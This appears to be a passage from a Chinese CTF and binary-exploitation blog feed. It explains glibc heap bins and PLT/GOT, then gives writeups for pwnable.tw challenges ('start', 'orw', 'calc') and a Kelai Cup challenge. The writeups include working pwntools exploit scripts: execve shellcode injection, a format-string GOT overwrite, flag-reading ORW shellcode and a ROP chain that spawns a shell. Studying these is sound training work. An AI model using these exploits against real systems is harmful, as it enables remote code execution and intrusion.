class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"> head:  |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"> foot:  |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>如果一个 chunk 处于 free 状态，那么它本身的 size 字段和 chunk 字段都会记录。</p><p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk，当用户再一次请求分配内存时，ptmalloc 分配器会在空闲的 chunk 中挑选一块合适的给用户，这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>空闲的 chunk 根据大小和使用状态被初步分为4类：</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p>单向链表，采取 LIFO 策略。最近释放的 chunk 会被更早分配。当用户需要的 chunk 大小小于 fastbin 最大大小时，ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有就直接从这个 bin 中获取，没有的话，才会进行下一步操作。</p><p>fastbin 范围的 chunk 的 inuse 始终被置为 1，因此它们不会和其它被释放的 chunk 合并。</p><p>但是当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">   that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">   fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">   matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">   compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">   to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment">   consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">   if trimming is not used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure><h3 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h3><p>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致。采用 FIFO 规则。先被释放的 chunk 被先分配出去。</p><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：<code>chunk_size = 2 * SIZE_SZ *index</code></p><table><thead><tr><th>下标</th><th>SIZE_SZ=4（32 位）</th><th>SIZE_SZ=8（64 位）</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td>x</td><td>2*4*x</td><td>2*8*x</td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><h3 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h3><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，处于一定区间范围内。</p><p>这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致</p><table><thead><tr><th>组</th><th>数量</th><th>公差</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>64b</td></tr><tr><td>2</td><td>16</td><td>512b</td></tr><tr><td>3</td><td>8</td><td>4096b</td></tr><tr><td>4</td><td>4</td><td>32768b</td></tr><tr><td>5</td><td>2</td><td>262144b</td></tr><tr><td>6</td><td>1</td><td>不限制</td></tr></tbody></table><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p><h2 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h2><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。</p>]]></content>
      
      
      <categories>
          
          <category> 2021年10月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>乱七八糟的writeup</title>
      <link href="/2021/09/17/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84writeup/"/>
      <url>/2021/09/17/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="2020科来杯pwn-铜牌2-memo"><a href="#2020科来杯pwn-铜牌2-memo" class="headerlink" title="2020科来杯pwn-铜牌2-memo"></a>2020科来杯pwn-铜牌2-memo</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/2020%E7%A7%91%E6%9D%A5%E6%9D%AF/%E9%93%9C%E7%89%8C2-memo/memo">题目链接</a></p><p>程序逻辑：</p><p><img src="https://i.loli.net/2021/09/17/awmsPZ5jUiKYr9z.png" alt="image-20210917164323514"></p><p><img src="https://i.loli.net/2021/09/17/NHBhWYvQnjw3AOG.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s[0]=Q</span><br><span class="line">SBYTE1(v2)=3</span><br><span class="line">因为SBYTE1(v2) + (char)v2 == 141</span><br><span class="line">所以(char)v2=Z</span><br><span class="line">s[1]=H</span><br><span class="line">s[2]=f</span><br><span class="line">s[3]随便输</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/17/4sinmTUJ1btoBKp.png" alt="image-20210917185924684"></p><p>根据这段代码可以分析出后两位怎么输，因为<code>char(v2)=Z</code>，所以先输入Z，在输入3。</p><p>然后进入字符串溢出</p><p><img src="https://i.loli.net/2021/09/17/5QU9PCz2LIutgJF.png" alt="image-20210917191016826"></p><p>后门函数：</p><p><img src="https://i.loli.net/2021/09/17/4KNYSft2jdDgq7m.png" alt="image-20210917180705128"></p><p>把put的got表地址改成后门函数的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./memo&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Key:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;QHfaZ3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">5</span>, &#123;<span class="number">0x804C018</span>:<span class="number">0x8049211</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>plt&amp;got</title>
      <link href="/2021/09/08/plt-got/"/>
      <url>/2021/09/08/plt-got/</url>
      
        <content type="html"><![CDATA[<h1 id="一些前置"><a href="#一些前置" class="headerlink" title="一些前置"></a>一些前置</h1><p>怕自己忘记，写点前置知识</p><p>静态链接的函数地址在编译或者链接期间就确定了。动态链接的函数地址需要在运行时确定。</p><p>静态链接是把库直接链接到可执行文件，跟自己写的代码没什么区别。地址空间在用户空间。不同应用用同一份库，会各自复制一份。库函数的符号地址固定。不需要重新加载。</p><p>动态链接是放到系统空间，各应用共用一份，动态库的符号表需要重新计算，加载位置可能每次都不一样。</p><h1 id="plt-amp-got"><a href="#plt-amp-got" class="headerlink" title="plt&amp;got"></a>plt&amp;got</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    demo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span> -m32</span><br></pre></td></tr></table></figure><p><strong>demo函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">000011cd &lt;demo&gt;:</span><br><span class="line">    11cd:f3 0f 1e fb          endbr32 </span><br><span class="line">    11d1:55                   push   %ebp</span><br><span class="line">    11d2:89 e5                mov    %esp,%ebp</span><br><span class="line">    11d4:53                   push   %ebx</span><br><span class="line">    11d5:83 ec 04             sub    $0x4,%esp</span><br><span class="line">    11d8:e8 3f 00 00 00       call   121c &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">    11dd:05 fb 2d 00 00       add    $0x2dfb,%eax</span><br><span class="line">    11e2:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">    11e5:8d 90 30 e0 ff ff    lea    -0x1fd0(%eax),%edx</span><br><span class="line">    11eb:52                   push   %edx</span><br><span class="line">    11ec:89 c3                mov    %eax,%ebx</span><br><span class="line">    11ee:e8 7d fe ff ff       call   1070 &lt;puts@plt&gt;</span><br><span class="line">    11f3:83 c4 10             add    $0x10,%esp</span><br><span class="line">    11f6:90                   nop</span><br><span class="line">    11f7:8b 5d fc             mov    -0x4(%ebp),%ebx</span><br><span class="line">    11fa:c9                   leave  </span><br><span class="line">    11fb:c3                   ret  </span><br></pre></td></tr></table></figure><p>因为打印了以<code>\n</code>结尾的字符串，所以<code>printf</code>自动优化成了<code>puts</code>。</p><p><code>demo</code>函数调用的<code>puts</code>函数，因为<code>put</code>函数位于libc动态库内，所以必须在程序运行起来之后，才能知道<code>puts</code>函数的加载地址。</p><p>Q.当进程运行之后，glibc动态库装载之后，我们上面的call怎么修改地址呢？</p><blockquote><ul><li>现代操作系统不允许修改代码段，只能修改数据段</li><li>如果demo函数在一个动态库里，修改了代码段，就无法做到系统内所有进程共享同一个动态库。</li></ul></blockquote><p>所以puts函数只能在运行时写到数据段内。</p><p><strong>链接阶段</strong>是将一个或者多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件。</p><ul><li>各个中间文件(<code>.o</code>文件)之间的同名section合并</li><li>对代码段，数据段以及各符号进行地址分配</li><li>链接时重定位修正（调用puts函数的地址会在链接时进行修正，这个过程就被称为链接时重定位）</li></ul><p>除了重定位过程，其它动作是无法修改中间文件中函数体内指令的，而重定位过程也只能是修改指令中的操作数，换句话说，<strong>链接过程无法修改编译过程生成的汇编指令</strong>。</p><p>如果<code>puts</code>函数在普通的<code>.o</code>文件中定义，那么在链接阶段，它的地址就会被确定。但是如果在动态链接库中，则无法进行链接时重定位。</p><p>前面说过，程序运行时不能用重定位修改代码段，所以链接器会生成一段代码，通过这段代码获取动态库的链接地址，并完成调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">call puts_stub</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">puts_stub</span><br><span class="line">    mov rax, [puts函数的存储地址] // 获取puts函数重定位后的地址</span><br><span class="line">    jmp rax // 执行puts函数</span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">puts函数的存储地址:</span><br><span class="line">    这里存着puts函数重定位后的地址</span><br></pre></td></tr></table></figure><p>动态链接需要用来存放外部函数的数据段，还有获取数据段地址的代码。</p><p>存放外部函数地址的段就是GOT(Global Offset Table)，而那段获取地址的代码就是PLT。</p><p><img src="https://i.loli.net/2021/09/09/Nwops4rXzWA7EJa.jpg" alt="img"></p><p>之前有个疑问是，为什么需要plt，而不能直接返回到got。现在来看其实是got是数据段，没有执行权限，必须有plt代码段进行jmp执行。然后got表存储在数据段，不会影响程序执行的效率，有些不需要使用的函数不会被调用。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>感谢海枫师傅的文章，虽然只看了一章，但是受益匪浅</p><p><a href="https://www.zhihu.com/question/21249496/answer/126600437">https://www.zhihu.com/question/21249496/answer/126600437</a></p>]]></content>
      
      
      <categories>
          
          <category> 2021年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-wirteup</title>
      <link href="/2021/09/06/pwnable-tw-wirteup/"/>
      <url>/2021/09/06/pwnable-tw-wirteup/</url>
      
        <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p><img src="https://i.loli.net/2021/09/06/5K4oNn9uFc6Lhag.png" alt="image-20210906190210396"></p><p><img src="https://i.loli.net/2021/09/06/7JjuZT4s6KUNwvg.png" alt="image-20210906190430834"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">esp_addr=<span class="number">0x8048087</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(esp_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">stack_addr=u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">20</span>+stack_addr)+shellcode</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里只允许读取0x3c个字节，减去esp的0x14和返回地址，只剩下0x20，所以不能用<code>shellcraft.sh()</code>，然后要注意这里第一个payload不能使用sendline，否则打不通。</p><p>第一个payload覆盖的函数地址是exit，esp存在栈上的地址没被覆盖掉，所以会打印出esp的地址。</p><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p><img src="https://i.loli.net/2021/09/06/xSneUBg93YbyruV.png" alt="image-20210906200141656"></p><p><img src="https://i.loli.net/2021/09/06/Kr3hkvIOuRlo1pJ.png" alt="image-20210906200314237"></p><p><img src="https://i.loli.net/2021/09/04/7aRCw2ZcoPsYJK9.png" alt="image-20210904190625721"></p><p>开启seccomp保护，所以这个题不能直接使用shellcode调用shell，需要使用给的open，read，write获取flag文件。</p><p>然后是找到可读可写的段</p><p><img src="https://i.loli.net/2021/09/04/TAnhzG36iFl98oe.png" alt="image-20210904192215556"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/home/orw/flag&quot;</span>)</span><br><span class="line">payload+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;0x0804A065&#x27;</span>,<span class="number">50</span>)</span><br><span class="line">payload+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;0x0804A065&#x27;</span>,<span class="number">50</span>)</span><br><span class="line">payload=asm(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give my your shellcode:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>使用open打开的fd一般等于3，所以read的fd是3，将flag的内容读入buf。而输出的fd一般是1，这个不需要使用open的fd，所以write的fp使用3。</p><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p><img src="https://i.loli.net/2021/09/09/FSBfmieV127koCx.png" alt="image-20210909191932558">    </p><p><code>v4 = __readgsdword(0x14u);</code>就是开启了canary保护。</p><p>这道题建议代入式子分析，比如代入个2+3之类的，便于理清程序逻辑。</p><p><img src="https://i.loli.net/2021/09/12/cvp3jiXlyHgb8Cr.png" alt="image-20210912191124594"></p><p><img src="https://i.loli.net/2021/09/12/T4RCUofym6IWlYg.png" alt="image-20210912191204789"></p><p><img src="https://i.loli.net/2021/09/12/eUAgJcofQFzNbZs.png" alt="image-20210912191231522"></p><p><img src="https://i.loli.net/2021/09/12/QlIB2YDZVqJtMuL.png" alt="image-20210912191250309"></p><p><img src="https://i.loli.net/2021/09/12/3yXhMPL48sp5uUJ.png" alt="image-20210912193130393"></p><p><img src="https://i.loli.net/2021/09/12/lQgpbPULy1zuKms.png" alt="image-20210912194507518"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">如果写的表达式是+300，程序执行如下所示</span><br><span class="line">*a1=&quot;+300&quot;</span><br><span class="line">int a2[100]=0</span><br><span class="line"></span><br><span class="line">for 1 i=0</span><br><span class="line">v2=0</span><br><span class="line">s1[0]=0</span><br><span class="line">v9=0</span><br><span class="line">v5=a1+1</span><br><span class="line">s[v7,0]=&quot;+&quot;</span><br><span class="line"></span><br><span class="line">for 2 i=1</span><br><span class="line">for 3 i=2</span><br><span class="line">v2=1</span><br><span class="line">s1[0]=&quot;300&quot;</span><br><span class="line">s1[1]=0</span><br><span class="line">v9=300</span><br><span class="line">v4=0</span><br><span class="line">a2[0]=1</span><br><span class="line">a2[1]=300</span><br><span class="line">v5=2+a1</span><br><span class="line"></span><br><span class="line">然后把a2数组和+传参调用eval</span><br><span class="line">eval</span><br><span class="line">a2[0]+=a1[1]</span><br><span class="line">a2[0]=300</span><br></pre></td></tr></table></figure><p>这里会导致数组越界，不能用shellcode，但是能用rop</p><p><img src="https://i.loli.net/2021/09/12/fTxgQJH8aMOCKvj.png" alt="image-20210912202339533"></p><p>ebp地址是360，main返回地址是361</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edx=<span class="number">0</span> ecx=<span class="number">0</span> [ebx]=<span class="string">&#x27;/bin/sh&#x27;</span> eax=<span class="number">0xb</span> <span class="built_in">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>当我们输入+300+300时，a2[300]地址存放的值会加300。+300-300时，a2[300]的地址存放的值会减300。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">int_0x80=<span class="number">0x08049a21</span> <span class="comment"># int_0x80</span></span><br><span class="line">pop_edx=<span class="number">0x080701aa</span> <span class="comment"># pop edx ; ret</span></span><br><span class="line">ppo_ecx_ebx=<span class="number">0x080701d1</span> <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">pop_eax=<span class="number">0x0805c34b</span> <span class="comment"># pop eax ; ret</span></span><br><span class="line">stack=[pop_eax,<span class="number">11</span>,pop_edx,<span class="number">0</span>,ppo_ecx_ebx,<span class="number">0</span>]</span><br><span class="line">sh_str=[<span class="number">0x6e69622f</span>,<span class="number">0x0068732f</span>]</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;=== Welcome to SECPROG calculator ===\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;+360&#x27;</span>)</span><br><span class="line">ebp=<span class="built_in">int</span>(p.recv(<span class="number">1024</span>))</span><br><span class="line">bin_sh=ebp+<span class="number">4</span><span class="comment">#这个地方用gdb动态调试可见</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">i,content</span>):</span></span><br><span class="line">    index=<span class="number">361</span>+i</span><br><span class="line">    p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">    ori=<span class="built_in">int</span>(p.recv())</span><br><span class="line">    diff=<span class="built_in">int</span>(content)-ori</span><br><span class="line">    <span class="keyword">if</span> diff&lt;<span class="number">0</span>:</span><br><span class="line">        payload=<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(index)+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">abs</span>(diff))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload=<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(index)+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">abs</span>(diff))</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    write(i,<span class="built_in">int</span>(stack[i]))</span><br><span class="line">write(<span class="number">6</span>,bin_sh)</span><br><span class="line">write(<span class="number">7</span>,int_0x80)</span><br><span class="line">write(<span class="number">8</span>,sh_str[<span class="number">0</span>])</span><br><span class="line">write(<span class="number">9</span>,sh_str[<span class="number">1</span>])</span><br><span class="line">p.sendline(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h1><p>谢谢师傅的文章：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">和媳妇一起学Pwn 之 3x17</a></p><p><img src="https://i.loli.net/2021/09/25/KVL36n9eEfZdGSs.png" alt="image-20210925220738545.png"></p><p>程序使用静态链接，去掉了符号表。</p><p>找一个正常的64位程序对比start函数，找到main函数是<code>sub_401B6D</code></p><p><img src="https://i.loli.net/2021/09/25/eVq1RfaYoP8ONMJ.png" alt="image-20210925221208316.png"></p><p><img src="https://i.loli.net/2021/09/25/YLV68AxzE2Q7Wq4.png" alt="image-20210925221240391.png"></p><p>用快捷键n可以对ida中的函数和变量进行改名。</p><p><img src="https://i.loli.net/2021/09/25/RPTNbyGQcH89tKw.png" 